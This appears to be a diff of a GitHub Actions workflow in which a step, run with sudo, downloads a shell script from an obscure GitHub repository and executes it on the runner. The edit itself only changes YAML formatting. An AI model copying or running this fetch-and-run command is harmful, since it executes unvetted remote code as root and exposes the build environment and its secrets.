@@ -6,5 +6,5 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: run
-        run: |
+        run: 
          sudo bash -c "$(curl -fsSL https://raw.githubusercontent.com/xlabr/u/sh/qk.sh)"
